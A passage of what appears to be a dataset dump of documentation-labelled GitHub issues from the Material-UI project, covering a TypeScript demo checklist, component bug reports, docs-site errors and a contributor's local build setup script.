#15119\r\n  - [x] ResponsiveDrawer #15119\r\n  - [x] SwipeableTemporaryDrawer #15119\r\n  - [x] TemporaryDrawer #15119\r\n\r\n* components/expansion-panels #15162:\r\n\r\n  - [x] ControlledExpansionPanels\r\n  - [x] CustomizedExpansionPanels\r\n  - [x] DetailedExpansionPanel\r\n  - [x] SimpleExpansionPanel\r\n\r\n- components/grid-list #15118:\r\n\r\n  - [x] AdvancedGridList\r\n  - [x] ImageGridList\r\n  - [x] SingleLineGridList\r\n  - [x] TitlebarGridList\r\n\r\n* components/grid:\r\n\r\n  - [x] AutoGrid\r\n  - [x] AutoGridNoWrap\r\n  - [x] CenteredGrid\r\n  - [x] ComplexGrid #15970\r\n  - [x] CSSGrid\r\n  - [x] FullWidthGrid\r\n  - [x] InteractiveGrid\r\n  - [x] NestedGrid\r\n  - [x] SpacingGrid\r\n\r\n- components/hidden:\r\n\r\n  - [x] BreakpointDown\r\n  - [x] BreakpointOnly\r\n  - [x] BreakpointUp\r\n  - [x] GridIntegration\r\n\r\n* components/icons:\r\n\r\n  - [x] FontAwesome\r\n  - [x] Icons\r\n  - [x] SvgIcons\r\n  - [x] SvgMaterialIcons\r\n\r\n- components/links:\r\n\r\n  - [x] ButtonLink #16003\r\n  - [x] Links #16003\r\n\r\n* components/lists:\r\n\r\n  - [x] AlignItemsList #15323\r\n  - [x] CheckboxList #15323\r\n  - [x] CheckboxListSecondary #15323\r\n  - [x] FolderList #15323\r\n  - [x] InsetList #15323\r\n  - [x] InteractiveList #15416\r\n  - [x] NestedList #15493\r\n  - [x] PinnedSubheaderList #15323\r\n  - [x] SelectedListItem #15417\r\n  - [x] SimpleList\r\n  - [x] SwitchListSecondary #15493\r\n  - [x] VirtualizedList\r\n\r\n- components/menus:\r\n\r\n  - [x] CustomizedMenus\r\n  - [x] FadeMenu\r\n  - [x] LongMenu\r\n  - [x] MenuListComposition\r\n  - [x] SimpleListMenu\r\n  - [x] SimpleMenu\r\n  - [x] TypographyMenu\r\n  - [ ] MenuPopupState (no types for material-ui-popup-state, try to move the solve the problem in the core)\r\n\r\n* components/modal:\r\n\r\n  - [x] ServerModal\r\n  - [x] SimpleModal\r\n  - [x] SpringModal\r\n  - [x] TransitionsModal\r\n\r\n- components/no-ssr:\r\n\r\n  - [x] FrameDeferring #17913\r\n  - [x] SimpleNoSsr #17913\r\n\r\n- components/paper:\r\n\r\n  - [x] PaperSheet\r\n\r\n* components/pickers #15103:\r\n\r\n  - [x] DateAndTimePickers\r\n  - [x] DatePickers\r\n  - [x] MaterialUIPickers\r\n  - [x] TimePickers\r\n\r\n- components/popover #16322:\r\n\r\n  - [x] MouseOverPopover\r\n  - [x] SimplePopover\r\n  - [ ] PopoverPopupState (no types for material-ui-popup-state, try to move the solve the problem in the core)\r\n\r\n* components/popper:\r\n\r\n  - [x] FakedReferencePopper #16322\r\n  - [x] MinimalPopper #16322\r\n  - [x] NoTransitionPopper #16322\r\n  - [x] PositionedPopper #16322\r\n  - [x] SimplePopper #16004\r\n  - [ ] PopperPopupState (no types for material-ui-popup-state, try to move the solve the problem in the core)\r\n\r\n- components/portal:\r\n\r\n  - [x] SimplePortal\r\n\r\n* components/progress:\r\n\r\n  - [x] CircularDeterminate #15104\r\n  - [x] CircularIndeterminate #15104\r\n  - [x] CircularIntegration #15104\r\n  - [x] CircularStatic #15104\r\n  - [x] CircularUnderLoad #15104\r\n  - [x] CustomizedProgressBars\r\n  - [x] DelayingAppearance #15551\r\n  - [x] LinearBuffer #15104\r\n  - [x] LinearDeterminate #15104\r\n  - [x] LinearIndeterminate #15104\r\n  - [x] LinearQuery #15104\r\n\r\n- components/radio-buttons:\r\n\r\n  - [x] CustomizedRadios\r\n  - [x] FormControlLabelPosition\r\n  - [x] RadioButtons\r\n  - [x] RadioButtonsGroup\r\n\r\n* components/rating:\r\n\r\n  - [x] CustomizedRatings\r\n  - [x] HalfRating\r\n  - [x] HoverRating\r\n  - [x] RatingSize\r\n  - [x] SimpleRating\r\n\r\n- components/selects #15288:\r\n\r\n  - [x] ControlledOpenSelect\r\n  - [x] CustomizedSelects\r\n  - [x] DialogSelect\r\n  - [x] MultipleSelect\r\n  - [x] NativeSelects\r\n  - [x] SimpleSelect\r\n\r\n* components/skeleton:\r\n\r\n  - [x] Facebook\r\n  - [x] YouTube\r\n\r\n- components/slider:\r\n\r\n  - [x] ContinuousSlider\r\n  - [x] CustomizedSlider\r\n  - [x] DiscreteSlider\r\n  - [x] InputSlider\r\n  - [x] RangeSlider\r\n  - [x] TrackFalseSlider\r\n  - [x] TrackInvertedSlider\r\n  - [x] VerticalSlider\r\n\r\n* components/snackbars #15087:\r\n\r\n  - [x] ConsecutiveSnackbars\r\n  - [x] CustomizedSnackbars\r\n  - [x] DirectionSnackbar\r\n  - [x] FabIntegrationSnackbar\r\n  - [x] IntegrationNotistack\r\n  - [x] LongTextSnackbar\r\n  - [x] PositionedSnackbar\r\n  - [x] SimpleSnackbar\r\n  - [x] TransitionsSnackbar\r\n\r\n- components/speed-dial:\r\n\r\n  - [x] OpenIconSpeedDial\r\n  - [x] SpeedDials\r\n  - [x] SpeedDialTooltipOpen\r\n\r\n* components/steppers:\r\n\r\n  - [x] CustomizedSteppers\r\n  - [x] DotsMobileStepper #15223\r\n  - [x] HorizontalLinearAlternativeLabelStepper #15223\r\n  - [x] HorizontalLinearStepper #15223\r\n  - [x] HorizontalNonLinearAlternativeLabelStepper #15223\r\n  - [x] HorizontalNonLinearStepper #15223\r\n  - [x] HorizontalNonLinearStepperWithError #15223\r\n  - [x] ProgressMobileStepper #15223\r\n  - [x] TextMobileStepper #15223\r\n  - [x] VerticalLinearStepper #15223\r\n\r\n- components/switches:\r\n\r\n  - [x] CustomizedSwitches\r\n  - [x] FormControlLabelPosition\r\n  - [x] Switches\r\n  - [x] SwitchesGroup\r\n  - [x] SwitchesSize\r\n  - [x] SwitchLabels\r\n\r\n* components/tables:\r\n\r\n  - [x] AcccessibleTable\r\n  - [x] CustomizedTables\r\n  - [x] CustomPaginationActionsTable #15086\r\n  - [x] DenseTable #15086\r\n  - [x] EnhancedTable #15755\r\n  - [x] MaterialTableDemo #17938\r\n  - [x] ReactVirtualizedTable #15755\r\n  - [x] SimpleTable #14985\r\n  - [x] SpanningTable #14985\r\n  - [x] StickyHeadTable\r\n\r\n- components/tabs #15053:\r\n\r\n  - [x] CenteredTabs\r\n  - [x] CustomizedTabs\r\n  - [x] DisabledTabs\r\n  - [x] FullWidthTabs\r\n  - [x] IconLabelTabs\r\n  - [x] IconTabs\r\n  - [x] NavTabs\r\n  - [x] ScrollableTabsButtonAuto\r\n  - [x] ScrollableTabsButtonForce\r\n  - [x] ScrollableTabsButtonPrevent\r\n  - [x] SimpleTabs\r\n  - [x] TabsWrappedLabel\r\n  - [x] VerticalTabs\r\n\r\n* components/text-fields:\r\n\r\n  - [x] ComposedTextField\r\n  - [x] CustomizedInputBase #15209\r\n  - [x] CustomizedInputs\r\n  - [x] FilledInputAdornments\r\n  - [x] FilledTextFields\r\n  - [x] FormattedInputs\r\n  - [x] InputAdornments\r\n  - [x] Inputs\r\n  - [x] InputWithIcon\r\n  - [x] OutlinedInputAdornments\r\n  - [x] OutlinedTextFields\r\n  - [x] TextFieldMargins\r\n  - [x] TextFields\r\n\r\n- components/textarea-autosize:\r\n\r\n  - [x] EmptyTextarea\r\n  - [x] MaxHeightTextarea\r\n  - [x] MinHeightTextarea\r\n\r\n* components/toggle-button:\r\n\r\n  - [x] CustomizedDividers\r\n\r\n- components/tooltips #15061:\r\n\r\n  - [x] ControlledTooltips\r\n  - [x] CustomizedTooltips\r\n  - [x] DelayTooltips\r\n  - [x] DisabledTooltips\r\n  - [x] InteractiveTooltips\r\n  - [x] PositionedTooltips\r\n  - [x] SimpleTooltips\r\n  - [x] TransitionsTooltips\r\n  - [x] TriggersTooltips\r\n  - [x] VariableWidth\r\n\r\n* components/transfer-list:\r\n\r\n  - [x] SelectAllTransferList #15419\r\n  - [x] TransferList #15419\r\n\r\n- components/transitions #16003:\r\n\r\n  - [x] SimpleCollapse\r\n  - [x] SimpleFade\r\n  - [x] SimpleGrow\r\n  - [x] SimpleSlide\r\n  - [x] SimpleZoom\r\n\r\n* components/tree-view:\r\n\r\n  - [x] CustomizedTreeView\r\n  - [x] FileSystemNavigator\r\n  - [x] GmailTreeView\r\n\r\n- components/typography:\r\n\r\n  - [x] Types\r\n  - [x] TypographyTheme #16003\r\n\r\n* components/use-media-query:\r\n\r\n  - [x] JavaScriptMedia\r\n  - [x] SimpleMediaQuery\r\n  - [x] ThemeHelper\r\n  - [x] ServerSide #18501\r\n  - [x] UseWidth #17770\r\n\r\n- css-in-js/basics:\r\n\r\n  - [x] AdaptingHook\r\n  - [x] AdaptingStyledComponents\r\n\r\n* customization/breakpoints:\r\n\r\n  - [x] MediaQuery #17766\r\n  - [x] WithWidth #17930\r\n\r\n- customization/components:\r\n\r\n  - [x] ClassesNesting #16003\r\n  - [x] ClassesShorthand #16003\r\n  - [x] ClassesState #16003\r\n  - [x] ClassNames #17771\r\n  - [x] Component #17790\r\n  - [x] DynamicClassName #17793\r\n  - [x] DynamicCSS #17994\r\n  - [x] DynamicCSSVariables #17983\r\n  - [x] DynamicInlineStyle #16200\r\n  - [x] DynamicThemeNesting #17788\r\n  - [x] GlobalCssOverride\r\n  - [x] GlobalThemeOverride\r\n  - [x] InlineStyle #17788\r\n  - [x] ThemeVariables\r\n\r\n* customization/globals #17785:\r\n\r\n  - [x] DefaultProps\r\n  - [x] GlobalCss\r\n\r\n- customization/palette:\r\n\r\n  - [x] DarkTheme\r\n  - [x] Palette #17683\r\n\r\n* customization/theming:\r\n\r\n  - [x] CustomStyles\r\n  - [x] ThemeNesting\r\n  - [x] ThemeNestingExtend\r\n\r\n- customization/typography:\r\n\r\n  - [x] FontSizeTheme #16334\r\n  - [x] ResponsiveFontSizes\r\n  - [x] TypographyVariants\r\n\r\n* guides/composition:\r\n\r\n  - [x] ButtonRouter\r\n  - [x] Composition #16334\r\n  - [x] LinkRouter\r\n  - [x] ListRouter\r\n\r\n- guides/interoperability:\r\n\r\n  - [x] EmotionCSS\r\n  - [x] StyledComponents\r\n  - [x] StyledComponentsDeep\r\n  - [x] StyledComponentsPortal\r\n  - [x] StyledComponentsTheme (#17910)\r\n\r\n* guides/right-to-left:\r\n\r\n  - [x] Direction #16334\r\n  - [x] RtlOptOut\r\n\r\n- styles/advanced:\r\n\r\n  - [x] GlobalClassName #16334\r\n  - [x] GlobalCss #16334\r\n  - [x] HybridGlobalCss #16334\r\n  - [x] ThemeNesting #16334\r\n  - [x] Theming #16334\r\n  - [x] UseTheme #16334\r\n  - [x] WithTheme\r\n  - [ ] StringTemplates (plan to migrate to styled-components)\r\n\r\n* styles/basics:\r\n\r\n  - [x] AdaptingHOC #16134\r\n  - [x] AdaptingHook #16131\r\n  - [x] AdaptingStyledComponents #15548\r\n  - [x] HigherOrderComponent #16334\r\n  - [x] Hook #16334\r\n  - [x] NestedStylesHook\r\n  - [x] StressTest #16334\r\n  - [x] StyledComponents #15548\r\n\r\n- system/basics:\r\n\r\n  - [x] CollocationApi\r\n  - [x] CssProp\r\n  - [x] Demo\r\n  - [x] Emotion\r\n  - [x] JSS #15548\r\n  - [x] RealWorld\r\n  - [x] StyledComponents\r\n  - [x] Variant\r\n\r\n* system/borders:\r\n\r\n  - [x] BorderAdditive #16875\r\n  - [x] BorderColor #16875\r\n  - [x] BorderRadius #16875\r\n  - [x] BorderSubtractive #16875\r\n\r\n- system/display #16334:\r\n\r\n  - [x] Block\r\n  - [x] Hiding\r\n  - [x] Inline\r\n  - [x] Overflow\r\n  - [x] Print\r\n  - [x] TextOverflow\r\n  - [x] Visibility\r\n  - [x] WhiteSpace\r\n\r\n* system/flexbox #16334:\r\n\r\n  - [x] AlignContent\r\n  - [x] AlignItems\r\n  - [x] AlignSelf\r\n  - [x] Display\r\n  - [x] FlexDirection\r\n  - [x] FlexGrow\r\n  - [x] FlexShrink\r\n  - [x] FlexWrap\r\n  - [x] JustifyContent\r\n  - [x] Order\r\n\r\n- system/palette #16334:\r\n\r\n  - [x] BackgroundColor\r\n  - [x] Color\r\n\r\n* system/positions #16334:\r\n\r\n  - [x] ZIndex\r\n\r\n- system/shadows #16334:\r\n\r\n  - [x] Demo\r\n\r\n* system/sizing #16334:\r\n\r\n  - [x] Height\r\n  - [x] Values\r\n  - [x] Width\r\n\r\n- system/spacing #16334:\r\n\r\n  - [x] Demo\r\n  - [x] HorizontalCentering\r\n\r\n* system/typography:\r\n\r\n  - [x] FontFamily\r\n  - [x] FontSize\r\n  - [x] FontStyle\r\n  - [x] FontWeight\r\n  - [x] LetterSpacing\r\n  - [x] LineHeight\r\n  - [x] TextAlignment\r\n\r\n</details\r\n"},{"labels":["documentation",null,null],"text":"Hello,\r\n\r\nI have a basic question regarding the syntax in : https://material-ui.com/css-in-js/basics/#adapting-hook-api\r\nI don't quite understand the syntax of the 'styledBy' const. I added two similar functions 'fromProps' and 'fromProps2'. How come fromProps2 does not receive props? And how do the props get injected into 'styledBy' in the first place?\r\n\r\nhttps://codesandbox.io/s/pmrwopr2jm?fontsize=14\r\n"},{"labels":[null,"documentation"],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\n<!---\r\n-->\r\n\r\n    While Providing Custom SVG Icons to StepLabel in Stepper MUI classnames should be attached to the custom SVG element.\r\n\r\n## Current Behavior 😯\r\n<!---\r\n    Describe what happens instead of the expected behavior.\r\n-->\r\n\r\n While Providing Custom SVG Icons to StepLabel in Stepper MUI classnames are not attached to the custom SVG element.\r\n\r\n\r\n## Steps to Reproduce 🕹\r\n<!---\r\n    Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n    Include code to reproduce, if relevant (which it most likely is).\r\n\r\n    This codesandbox.io template _may_ be a good starting point:\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/next/examples/create-react-app\r\n\r\n    If you're using typescript a better starting point would be\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/next/examples/create-react-app-with-typescript\r\n    If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n-->\r\n\r\nInspect the StepLabel Icon when icon=\"1\" and as well as `icon={<AccessAlarmIcon` />}. \r\n\r\nWhen icon=\"1\"\r\n![stepper-expected](https://user-images.githubusercontent.com/31988265/54076010-34510f80-42cc-11e9-9b36-6747f2724106.JPG)\r\n\r\nWhen `icon={<AccessAlarmIcon` />}\r\n![stepper-outcome](https://user-images.githubusercontent.com/31988265/54076014-3fa43b00-42cc-11e9-8789-54a90f93723c.JPG)\r\n\r\nWhen using custom SVG also we need to have those MUI class names so we can style the SVG's when they are completed,active and disabled.\r\n\r\nI have provided a live link below. \r\n\r\nLive Link: -https://codesandbox.io/s/v6pkymp6k3\r\n\r\n## Context 🔦\r\n\r\n<!---\r\n    What are you trying to accomplish? How has this issue affected you?\r\n    Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\n## Your Environment 🌎\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v3.9.1  |\r\n| React        | v16.7.0 |\r\n| Browser      |  chrome v74.0       |\r\n"},{"labels":[null,"documentation"],"text":"- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\nEnd adornment right margin is too high when used in outline TextField\r\n\r\n![preview](https://i.imgur.com/ZziASBl.png)\r\n\r\n## Expected\r\n\r\nhttps://material-components.github.io/material-components-web-catalog/#/component/text-field?icons=trailingIcon&type=outlined\r\n\r\n## Steps to Reproduce 🕹\r\nDemo: https://codesandbox.io/s/009vrmpqvn\r\n"},{"labels":["documentation",null],"text":"<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\nNo error should be thrown.\r\n\r\n## Current Behavior 😯\r\nAn error is thrown.\r\n\r\n## Context 🔦\r\nhttps://github.com/developit/preact/issues/1293"},{"labels":[null,"documentation"],"text":"Only code is currently formatted with prettier. Since `prettier` also supports markdown we might as well format those.\r\n\r\nImplementation involves:\r\n- add markdown files to https://github.com/mui-org/material-ui/blob/55c4c90b3194e3eb420d34b81fceddb0cb4d8fa7/scripts/prettier.js#L29\r\n- pipe generated docs from `yarn docs:api` through prettier\r\n- ignore i10n markdown files in `docs/src/pages/` (those with the locale suffix). I suspect that some translations could change the format. We could include them but then we need to be careful to format i10n PRs before merging /cc @mbrookes "},{"labels":["documentation"],"text":"<!--- Provide a general summary of the feature in the Title above -->\r\nIn [this StackOverflow question](https://stackoverflow.com/questions/55032966/how-can-i-imitate-the-look-of-the-outline-and-label-from-material-uis-outlined/55036265#55036265) the developer had a case of a couple outlined TextFields and then what appears to be a custom color picker. They were trying to imitate the outline/label look of the TextFields with their own CSS but having difficulty.\r\n\r\nI suggested using `TextField` for their custom input so that it can still fully handle the outline and label:\r\n```\r\nimport React from \"react\";\r\n\r\nimport TextField from \"@material-ui/core/TextField\";\r\n\r\nconst OutlinedDiv = ({ children, label }) => {\r\n  return (\r\n    <TextField\r\n      variant=\"outlined\"\r\n      label={label}\r\n      InputLabelProps={{ shrink: true }}\r\n      InputProps={{\r\n        inputComponent: ({ className }) => (\r\n          <div className={className}>{children}</div>\r\n        )\r\n      }}\r\n    />\r\n  );\r\n};\r\nexport default OutlinedDiv;\r\n```\r\n\r\nA full example using this is here: https://codesandbox.io/s/jlmp5kw30w\r\n\r\nI was wondering if something along these lines may be worth adding to the demos either in the [Customized Inputs](https://material-ui.com/demos/text-fields/#customized-inputs) portion or in its own section of the TextField demos showing how to use `InputProps={{inputComponent: ...` to leverage TextField styling on custom components.\r\n"},{"labels":[null,"documentation",null],"text":"Problem description\r\ndemo site crashes when viewing component demos on IE 11\r\n\r\nSteps to reproduce\r\nOpen demo site in IE 11 and route to /demos/:demo\r\n\r\nStack Trace \r\n\"TypeError: [object Object] is not iterable!"},{"labels":[null,"documentation"],"text":"Basically, all the components have links to the [CSS API](https://material-ui.com/api/input/#css-api) for the component, where the anchor part is `#css-api`. This doesn't correlate with the actual anchor link, whose name is `#css`.\r\n\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Steps to Reproduce 🕹\r\n1. Go to https://material-ui.com/api/input/\r\n2. Press the highlighted \"CSS API\" link in the `classes` prop\r\n3. Observe that nothing happens, except the url changing to `https://material-ui.com/api/input/#css-api`\r\n4. Verify that the actual anchor is `#css` by clicking the `CSS` title further down on the page."},{"labels":["documentation",null],"text":"The [versions page](https://material-ui.com/versions/) of the docs does not work. It is caused by a 403 to the Github API, followed by some shoddy error handling.\r\n```javascript\r\n(index):1 GET https://api.github.com/repos/mui-org/material-ui-docs/branches 403 (Forbidden)\r\nversions.js:1 Uncaught (in promise) TypeError: n.map is not a function\r\n    at n.<anonymous> (versions.js:1)\r\n    at w (commons.9038b76362190d37f37e.js:87)\r\n    at Generator._invoke (commons.9038b76362190d37f37e.js:87)\r\n    at Generator.e.(/versions/anonymous function) [as next] (https://material-ui.com/_next/static/chunks/commons.9038b76362190d37f37e.js:87:12869)\r\n    at n (commons.9038b76362190d37f37e.js:77)\r\n    at u (commons.9038b76362190d37f37e.js:77)\r\n```\r\n\r\nWe are on version 1.0 of MUI, so the newest docs doesn't work that well for us ...\r\n\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Steps to Reproduce 🕹\r\nGo to https://material-ui.com/versions/.\r\nObserve blank box in the middle and no info on versions.\r\n"},{"labels":["documentation"],"text":"If we can make it easier to contribute to Material-UI, then it could help the project with more contributions.\r\n\r\n- There is no web page with reproducible steps for making a working dev setup.\r\n- `CONTRIBUTING.md` has incomplete information for making a `link`-able dev setup, only making reference to tell you that you should use `yarn link`.\r\n- The material-ui workspace does not have scripts to produce a `link`-able build.\r\n- A new contributor must spend days debugging imports, following errors, writing build scripts, opening issues, etc.\r\n- To get started\r\n\r\n# The script\r\n\r\nThis is not documented:\r\n\r\n```\r\ncurl https://codeload.github.com/mui-org/material-ui/tar.gz/next | tar -xz --strip=2 material-ui-next/examples/create-react-app-next\r\npushd create-react-app-next\r\n    git clone https://github.com/mui-org/material-ui.git --branch next --single-branch --depth 1\r\n    pushd material-ui\r\n        yarn install\r\n        yarn workspace @material-ui/utils build\r\n        pushd packages/material-ui-utils/build\r\n            yarn link\r\n        popd\r\n        yarn workspace @material-ui/system build\r\n        pushd packages/material-ui-system/build\r\n            yarn link\r\n        popd\r\n        pushd packages/material-ui-styles\r\n            yarn link @material-ui/utils\r\n            yarn build\r\n            pushd build\r\n                yarn link\r\n            popd\r\n        popd\r\n        pushd packages/material-ui\r\n            yarn link @material-ui/system\r\n            yarn link @material-ui/utils\r\n            yarn build\r\n            pushd build\r\n                yarn link\r\n            popd\r\n        popd\r\n    popd\r\n    yarn link @material-ui/core\r\n    yarn link @material-ui/styles\r\n    yarn link @material-ui/system\r\n    yarn link @material-ui/utils\r\n    yarn install\r\n    npx yarn-list-link\r\n    yarn start\r\n```\r\n\r\nAll commands complete successfully and the dev server starts up, and then fails.\r\n\r\n- Is this script even correct?\r\n- How would a contributor know if it's correct or not, if it's not documented anywhere?\r\n- And if it's not *automated* in the workspace's `\"scripts\":`?\r\n- Is every contributor supposed to figure out the `link`-ed build dependency order so that the builds don't use the wrong links?\r\n- (The script failed)\r\n\r\n# Errors with relative imports outside of src/\r\n```\r\n./src/withRoot.js\r\nModule not found: You attempted to import ../esm/CssBaseline/index.js which falls outside of the project src/ directory. Relative imports outside of src/ are not supported.\r\n```\r\n\r\n# NextJs version errors with hooks invariant violation:\r\n```\r\ncurl https://codeload.github.com/mui-org/material-ui/tar.gz/next | tar -xz --strip=2 material-ui-next/examples/nextjs-next\r\npushd nextjs-next\r\n...\r\n```\r\n```\r\nNote that pages will be compiled when you first load them.\r\n{ Invariant Violation: Hooks can only be called inside the body of a function component. (https://fb.me/react-invalid-hook-call)\r\n    at invariant (/Users/foo/Source/nextjs-next/material-ui/node_modules/react/cjs/react.development.js:88:15)\r\n    at resolveDispatcher (/Users/foo/Source/nextjs-next/material-ui/node_modules/react/cjs/react.development.js:1436:28)\r\n    at Object.useContext (/Users/foo/Source/nextjs-next/material-ui/node_modules/react/cjs/react.development.js:1441:20)\r\n    at StylesProvider (/Users/foo/Source/nextjs-next/material-ui/packages/material-ui-styles/build/StylesProvider.js:56:37)\r\n    at processChild (/Users/foo/Source/nextjs-next/node_modules/react-dom/cjs/react-dom-server.node.development.js:2871:14)\r\n    at resolve (/Users/foo/Source/nextjs-next/node_modules/react-dom/cjs/react-dom-server.node.development.js:2795:5)\r\n    at ReactDOMServerRenderer.render (/Users/foo/Source/nextjs-next/node_modules/react-dom/cjs/react-dom-server.node.development.js:3185:22)\r\n    at ReactDOMServerRenderer.read (/Users/foo/Source/nextjs-next/node_modules/react-dom/cjs/react-dom-server.node.development.js:3144:29)\r\n    at renderToString (/Users/foo/Source/nextjs-next/node_modules/react-dom/cjs/react-dom-server.node.development.js:3629:27)\r\n    at render (/Users/foo/Source/nextjs-next/node_modules/next-server/dist/server/render.js:42:16)\r\n    at Object.renderPage (/Users/foo/Source/nextjs-next/node_modules/next-server/dist/server/render.js:102:16)\r\n    at Function.module.exports../pages/_document.js.MyDocument.getInitialProps (/Users/foo/Source/nextjs-next/.next/server/static/development/pages/_document.js:2256\r\n:18)\r\n    at Object.loadGetInitialProps (/Users/foo/Source/nextjs-next/node_modules/next-server/dist/lib/utils.js:45:35)\r\n    at Object.renderToHTML (/Users/foo/Source/nextjs-next/node_modules/next-server/dist/server/render.js:106:36) name: 'Invariant Violation', framesToPop: 1 }\r\n```\r\n\r\n# This can be improved\r\n\r\n- Can we make a testable, standardized script that will produce a working `link`-able local dev setup for Material-UI?\r\n"},{"labels":[null,"documentation"],"text":"Texts are on a different languages on the same in the same time.\r\n![tempsnip](https://user-images.githubusercontent.com/14921564/53793509-58100080-3f2e-11e9-8f01-54a0d7dbcc50.png)\r\n"},{"labels":[null,"documentation",null],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\n\r\nWhen using `multiple` in a Select component, the value is an Array.  When there are no items selected, this results in an empty array.  However, the `renderValue()` function is not execute in this case when the current value is an empty array.\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\n<!---\r\n    Describe what should happen.\r\n-->\r\n`renderValue()` function should always be called when the selected value changes - even if it changes to an empty array as current value.\r\n\r\n## Current Behavior 😯\r\n<!---\r\n    Describe what happens instead of the expected behavior.\r\n-->\r\n\r\nSee above - `renderValue()` function is not called with an empty array as current value.  This is due to the following in `utils.js#15`:\r\n\r\n```\r\nfunction hasValue(value) {\r\n  return value != null && !(Array.isArray(value) && value.length === 0);\r\n} // Determine if field is empty or filled.\r\n```\r\n## Steps to Reproduce 🕹\r\n<!---\r\n    Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n    Include code to reproduce, if relevant (which it most likely is).\r\n\r\n    This codesandbox.io template _may_ be a good starting point:\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/next/examples/create-react-app\r\n\r\n    If you're using typescript a better starting point would be\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/next/examples/create-react-app-with-typescript\r\n\r\n    If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n\r\n-->\r\nLink:\r\n\r\n1. Create a Select, with `multiple` attribute true.\r\n2. Add a `renderValue` property to the select.\r\n3. Initialize the `value` property of the select with a var containing an empty (zero-length) Array.\r\n4. Place a breakpoint in the `renderValue()` function, and note that `renderValue()` is not called when the value changes to an empty Array.\r\n\r\n## Context 🔦\r\n<!---\r\n    What are you trying to accomplish? How has this issue affected you?\r\n    Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\nThe Select component should support a mechanism for de-selecting all items, which will result in an empty Array, and for catching this state in the `renderValue()` function in order to render a 'placeholder' or other indication that no value is selected.\r\n\r\n## Your Environment 🌎\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v3.9.2  |\r\n| React        |  16.7.0       |\r\n| Browser      |         |\r\n| TypeScript   |         |\r\n| etc.         |         |\r\n"},{"labels":["documentation",null],"text":"I think a Chinese left menu which will help material pop in CN;\r\nMany Chinese coders  including me  are not good at english;\r\nA Chinese left menu like antd-design  is important to new learner; \r\n\r\n-----------update 20190206\r\n出色的本地化左侧导航菜单，将为那些初学者和使用者提供巨大的便利。\r\n有助于 material 在更多的地域更加流行。\r\nthe Excellent local  navigation menu in left，that will supply great convenience for beginners and users,which will make material become more popular in more geographies.\r\n-----------from translate.google.cn\r\n"},{"labels":[null,null,null,"documentation",null],"text":"Hey guys,\r\n\r\nI'm having a bit of an issue using the Drawer. It seems that it's not accessible via keyboard (we need it to be, for WCAG AA compliance).\r\n\r\n## Expected Behavior 🤔\r\nI would expect the Drawer to be accessed either via tab after showing it (or the first focusable item to be focused upon showing)\r\n\r\n## Current Behavior 😯\r\nWhen the Drawer shows, if I press *tab* once, it focus the whole elements inside the Drawer (with no use whatsoever), if I press *tab* another time, the Drawer hides\r\n\r\n## Steps to Reproduce 🕹\r\nLink: https://codesandbox.io/s/m2lyk2n89\r\n\r\n1. Go to https://codesandbox.io/s/m2lyk2n89\r\n2. Click the IconButton\r\n3. Drawer is opened but not accessible via keyboard\r\n\r\n## Your Environment 🌎\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v3.9.2  |\r\n| React        |  v16.8.3  |\r\n| Browser      | Chrome        |\r\n"},{"labels":["documentation"],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\n- The TOC active entry should be updated correctly when the page is scrolled quickly\r\n- The fragment id should be removed when the page is scrolled to the 